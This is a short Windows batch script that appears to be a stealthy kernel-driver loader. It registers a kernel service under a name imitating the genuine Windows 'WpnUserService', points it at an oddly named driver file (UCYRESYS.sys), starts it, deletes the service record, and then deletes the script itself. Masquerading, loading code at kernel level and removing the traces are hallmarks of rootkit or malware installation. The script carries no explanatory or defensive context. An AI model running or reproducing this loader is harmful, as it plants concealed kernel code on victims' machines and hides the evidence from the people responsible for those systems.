@echo off
cd %~dp0
sc create WpnUserService_71ad5 binpath=C:\Windows\SysWOW64\drivers\UCYRESYS.sys type=kernel
sc start WpnUserService_71ad5
sc delete WpnUserService_71ad5
del "%~f0"



